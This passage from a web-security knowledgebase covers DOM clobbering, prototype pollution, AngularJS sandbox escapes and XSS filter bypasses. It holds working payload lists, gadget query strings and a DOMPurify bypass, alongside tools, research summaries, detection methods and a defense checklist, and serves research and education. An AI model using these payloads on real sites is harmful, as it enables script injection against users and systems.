| **pp-finder** | Find prototype pollution gadgets | https://github.com/yeswehack/pp-finder |
| **pp-debugger** | Debug prototype pollution | https://github.com/GoogleChromeLabs/pp-debugger |

### General Recon & Scanning

| Tool | Purpose | URL |
|------|---------|-----|
| **Nuclei** | Fast vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **Katana** | Web crawler | https://github.com/projectdiscovery/katana |
| **Httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **Subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **Interactsh** | OOB interaction | https://github.com/projectdiscovery/interactsh |
| **Notify** | Notification framework | https://github.com/projectdiscovery/notify |
| **Cariddi** | URL extraction | https://github.com/edoardottt/cariddi |
| **Smuggler** | HTTP request smuggling | https://github.com/defparam/smuggler |

### XSS & Payload Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Tiny-XSS-Payloads** | Short XSS payloads | https://github.com/terjanq/Tiny-XSS-Payloads |
| **XSS Payload List** | Comprehensive XSS payloads | https://github.com/payloadbox/xss-payload-list |
| **SecLists** | Wordlists for fuzzing | https://github.com/danielmiessler/SecLists |
| **postMessage-tracker** | Track postMessage usage | https://github.com/fransr/postMessage-tracker |

### Browser Extension Tools

| Tool | Purpose |
|------|---------|
| **DOM Invader (Burp)** | Detect DOM clobbering, prototype pollution, DOM XSS |
| **pp-finder (CLI)** | Static analysis for PP gadgets |
| **Chrome DevTools** | Manual DOM inspection, breakpoint debugging |

---

## Advanced Research

### DOM Clobbering Strikes Back (Gareth Heyes, 2020)

Key findings:
- **HTMLCollection abuse**: Multiple elements with same `name` create collections that expose named properties
- **NamedNodeMap**: Element attributes can be accessed by name, creating unexpected property chains
- **Form clobbering**: Forms with `name` attributes create deep property chains via `document.formName.inputName`
- **iframe chains**: Nested iframes with `name` attributes enable arbitrary-depth clobbering

### Bypassing CSP via DOM Clobbering (Gareth Heyes, 2023)

Key findings:
- DOM Clobbering can bypass CSP by manipulating trusted script execution
- `strict-dynamic` bypass via clobbering script loader variables
- Nonce-based CSP bypass via `querySelector` hijacking
- Meta tag injection can override CSP headers in some browsers

### Exploiting XSS in Hidden Inputs and Meta Tags

Key findings:
- Hidden inputs can be clobbered to leak data or execute code
- Meta tags with `http-equiv` can inject headers (including CSP)
- `<meta charset>` manipulation can enable charset-based XSS
- `<meta http-equiv="refresh">` can redirect to attacker URLs

### AngularJS Research (PortSwigger)

Key findings:
- Angular expressions execute even when HTML-encoded
- Sandbox escapes exist for all AngularJS versions
- `charAt` backdooring breaks sanitizer and sandbox
- Angular 1.6+ removed sandbox but CSTI still dangerous

---

## Bug Bounty Writeups

### PayPal CSP Bypass ($900)
- **Researcher**: Gareth Heyes
- **Technique**: CSP policy injection via `token` parameter in `report-uri`
- **Impact**: Full CSP bypass on PayPal
- **Key Learning**: Parameter injection in CSP directives is dangerous

### PortSwigger Nonce CSP Bypass
- **Researcher**: PortSwigger Research Team
- **Technique**: `querySelector` prefix hijacking + DOM Clobbering
- **Impact**: Script injection despite nonce-based CSP
- **Key Learning**: `querySelector` returns first match; order matters

### DOM Clobbering to XSS (Multiple Programs)
- **Technique**: Clobber `window.config` → bypass settings → XSS
- **Impact**: Stored/DOM XSS on multiple platforms
- **Key Learning**: Always declare variables; don't rely on implicit globals

### AngularJS Sandbox Escapes (Google VRP)
- **Researchers**: Multiple (Mario Heiderich, Jan Horn, Gareth Heyes, etc.)
- **Impact**: Arbitrary JS on AngularJS sites
- **Key Learning**: Client-side frameworks can introduce XSS even in "safe" contexts

---

## Payload Collections

### DOM Clobbering Payloads (from PayloadsAllTheThings)

```html
<!-- Level 1: x -->
<a id=x href="javascript:alert(1)">

<!-- Level 2: x.y -->
<a id=x><a id=x name=y href="javascript:alert(1)">

<!-- Level 2 (form variant): x.y.value -->
<form id=x><input id=y name=z value="clobbered"></form>

<!-- Level 3: x.y.z -->
<form id=x name=y><input id=z></form><form id=x></form>

<!-- Level 4+: a.b.c.d -->
<iframe name=a srcdoc="<iframe srcdoc='<a id=c name=d href=javascript:alert(1)>x</a><a id=c>' name=b>"></iframe>

<!-- forEach clobbering (Chrome) -->
<form id=x><input id=y name=z><input id=y></form>

<!-- getElementById shadowing -->
<html id="test">clobbered</html>

<!-- username/password clobbering -->
<a id=x href="ftp:user:pass@host">

<!-- Firefox-specific -->
<base href=a:abc><a id=x href="Firefox<>">

<!-- Chrome-specific -->
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
```

### DOMPurify Bypass via cid: Protocol

```html
<!-- DOMPurify allows cid: protocol, doesn't encode double quotes -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

### AngularJS Sandbox Escapes (Complete List)

```javascript
// 1.0.1 - 1.1.5
{{constructor.constructor('alert(1)')()}}

// 1.2.0 - 1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// 1.2.2 - 1.2.5
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+"'");}}

// 1.2.6 - 1.2.18
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

// 1.2.19 - 1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

// 1.2.24 - 1.2.29
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+"'");}}

// 1.3.0
{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);')) );}}

// 1.3.1 - 1.3.2
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}

// 1.3.3 - 1.3.18
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//');}}

// 1.3.19
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//');}}

// 1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

// 1.4.0 - 1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// 1.5.0 - 1.5.8
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.5.9 - 1.5.11
{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a;}}

// >= 1.6.0 (sandbox removed)
{{constructor.constructor('alert(1)')()}}
```

### Prototype Pollution Gadgets (BlackFan)

```javascript
// Wistia Embedded Video
?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>

// jQuery $.get
?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x

// jQuery $.get >= 3.0.0
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script

// jQuery $.getScript >= 3.4.0
?__proto__[src][]=data:,alert(1)//

// jQuery $(html)
?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dalert(1)>

// Google reCAPTCHA
?__proto__[srcdoc][]=<script>alert(1)</script>

// Google Tag Manager
?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>

// DOMPurify <= 2.0.12
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src

// Google Closure
?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1

// Vue.js
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[template]=<script>alert(1)</script>

// Google Analytics
?__proto__[cookieName]=COOKIE=Injection;
```

---

## WAF Bypasses

### HTML Encoding Bypasses

```html
<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Decimal entities -->
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

<!-- Hex entities -->
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
```

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<svg OnLoad=alert(1)>
<IMG SRC=JaVaScRiPt:alert(1)>
```

### Whitespace Injection

```html
<img src=x onerror = alert(1)>
<img src=x onerror= alert(1)>
<img/src=x/onerror=alert(1)>
```

### Protocol Bypasses

```html
<!-- JavaScript pseudo-protocol variants -->
javascript:alert(1)
jav&#x09;ascript:alert(1)
jav&#x0A;ascript:alert(1)
jav&#x0D;ascript:alert(1)

<!-- Data URI -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- CID protocol (DOMPurify) -->
cid:&quot;onerror=alert(1)//
```

### Comment Injection

```html
<!-- Bypass filters that strip <script> -->
</scrip</script>t><img src=x onerror=alert(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

---

## Detection Techniques

### Static Analysis

```javascript
// Look for these patterns in source code:

// 1. Undeclared variables
let x = someVar; // someVar was never declared

// 2. Implicit global access
if (config.debug) { ... } // config might be clobbered

// 3. document.getElementById without null check
let el = document.getElementById('id');
el.innerHTML = ...; // el could be null or wrong element

// 4. Form access via name
let val = formName.inputName.value;

// 5. querySelector with prefix/suffix
let el = document.querySelector('[id^="prefix-"]');

// 6. Dynamic property access
let prop = window['propName'];
let prop = obj['prop' + 'Name'];
```

### Dynamic Analysis

```javascript
// In browser console, check for clobbering:

// 1. Check if variable is DOM element instead of expected type
typeof window.config; // "object" instead of expected
window.config instanceof HTMLElement; // true = clobbered

// 2. Check HTMLCollection creation
document.testName; // If HTMLCollection, multiple elements exist

// 3. Monitor property access
Object.defineProperty(window, 'config', {
  get() { console.trace('config accessed'); return undefined; },
  set(v) { console.trace('config set', v); }
});
```

### DOM Invader Detection

1. Open Burp Suite with DOM Invader enabled
2. Navigate to target page
3. Open browser DevTools → DOM Invader tab
4. Click "Scan for DOM Clobbering"
5. Review results for:
   - Named property creation
   - HTMLCollection formation
   - Potential sink connections

### pp-finder Detection

```bash
# Install pp-finder
npm install -g pp-finder

# Run against target application
pp-finder run node target_app.js

# Look for output like:
# [PP][prop] "prepareStackTrace" at ...
# [PP][forIn] "_" at ...
# [PP][elem] "filename" at ...
```

---

## References

### Primary Research

| Reference | Author | Year | Topic |
|-----------|--------|------|-------|
| DOM Clobbering Strikes Back | Gareth Heyes (PortSwigger) | 2020 | Advanced DOM Clobbering |
| Bypassing CSP via DOM Clobbering | Gareth Heyes (PortSwigger) | 2023 | CSP bypass techniques |
| Exploiting XSS in Hidden Inputs | Gareth Heyes (PortSwigger) | 2022 | Hidden input/meta tag XSS |
| XSS without HTML: CSTI with AngularJS | Gareth Heyes (PortSwigger) | 2016 | AngularJS sandbox escape |
| Ambushed by AngularJS | Gareth Heyes (PortSwigger) | 2016 | Hidden CSTI |
| Bypassing CSP with Policy Injection | Gareth Heyes (PortSwigger) | 2019 | PayPal CSP bypass |
| Hunting Nonce-Based CSP Bypasses | PortSwigger Research | 2021 | Dynamic analysis for CSP |
| Hijacking Service Workers via DOM Clobbering | Gareth Heyes | 2022 | Service worker abuse |

### Documentation

| Reference | Topic |
|-----------|-------|
| MDN HTMLCollection | https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection |
| MDN NamedNodeMap | https://developer.mozilla.org/en-US/docs/Web/API/NamedNodeMap |
| MDN Document | https://developer.mozilla.org/en-US/docs/Web/API/Document |
| MDN Window | https://developer.mozilla.org/en-US/docs/Web/API/Window |
| MDN Element.id | https://developer.mozilla.org/en-US/docs/Web/API/Element/id |
| MDN Element.name | https://developer.mozilla.org/en-US/docs/Web/API/Element/name |

### Tools & Repositories

| Tool | URL |
|------|-----|
| DOM Invader | https://github.com/PortSwigger/dom-invader |
| PayloadsAllTheThings (DOM Clobbering) | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering |
| Client-Side Prototype Pollution | https://github.com/BlackFan/client-side-prototype-pollution |
| pp-finder | https://github.com/yeswehack/pp-finder |
| pp-debugger | https://github.com/GoogleChromeLabs/pp-debugger |
| Tiny XSS Payloads | https://github.com/terjanq/Tiny-XSS-Payloads |
| XSS Payload List | https://github.com/payloadbox/xss-payload-list |
| Nuclei Templates | https://github.com/projectdiscovery/nuclei-templates |
| postMessage-tracker | https://github.com/fransr/postMessage-tracker |
| SecLists | https://github.com/danielmiessler/SecLists |

### Educational Resources

| Resource | URL |
|----------|-----|
| PortSwigger Web Security Academy - DOM Clobbering | https://portswigger.net/web-security/dom-based/dom-clobbering |
| PortSwigger Web Security Academy - DOM-based XSS | https://portswigger.net/web-security/cross-site-scripting/dom-based |
| HackTricks - DOM Clobbering | https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html |
| PortSwigger Research Blog | https://portswigger.net/research |

### Bug Bounty Writeups

| Program | Researcher | Technique |
|---------|-----------|-----------|
| PayPal | Gareth Heyes | CSP policy injection |
| PortSwigger | Alex Borshik | Nonce CSP bypass via dynamic analysis |
| Multiple | Various | DOM Clobbering to XSS |
| Google VRP | Mario Heiderich, Jan Horn | AngularJS sandbox escapes |

---

## Quick Reference Card

### Clobbering Depth Cheat Sheet

```
Depth 1 (x):        <a id=x href=...>
Depth 2 (x.y):      <a id=x><a id=x name=y href=...>
                    <form id=x><input name=y value=...>
Depth 3 (x.y.z):    <form id=x name=y><input id=z></form><form id=x></form>
Depth 4+ (a.b.c.d): <iframe name=a srcdoc="<iframe name=b srcdoc='<a id=c name=d>'>">
```

### Browser-Specific Notes

| Browser | Quirk |
|---------|-------|
| Chrome | HTMLCollection has `forEach`; `getElementById` shadowed by `<html>`/`<body>` |
| Firefox | `<base>` tag affects href resolution; `name` on `<a>` is stronger |
| Safari | Stricter CSP; `document.all` differs |
| Edge Legacy | CSP drops entirely on invalid directive |

### Dangerous Sinks

```javascript
// JavaScript execution
eval()
Function()
setTimeout()
setInterval()

// HTML injection
innerHTML
outerHTML
document.write()
document.writeln()

// URL navigation
location.href
location.replace()
location.assign()
window.open()

// Script loading
importScripts()
dynamic import()
<script>.src
<link>.href

// postMessage
postMessage() // if target or origin is clobbered
```

### Defense Checklist

```
□ Always declare variables before use (let/const)
□ Use 'use strict' mode
□ Validate types before using DOM-derived values
□ Use document.getElementById() with null checks
□ Avoid querySelector with loose prefix/suffix matches
□ Sanitize HTML injection points
□ Use CSP with strict-dynamic + nonce correctly
□ Avoid allowing user input in CSP directives
□ Regularly audit JavaScript for gadget patterns
□ Test with DOM Invader during development
```

---

> **Disclaimer**: This knowledgebase is for authorized security research, bug bounty hunting, and educational purposes only. Always obtain proper authorization before testing systems you do not own.

> **Last Updated**: 2026-05-23
> **Compiled from**: 40+ authoritative sources including PortSwigger Research, MDN Web APIs, GitHub security repositories, and peer-reviewed bug bounty writeups.
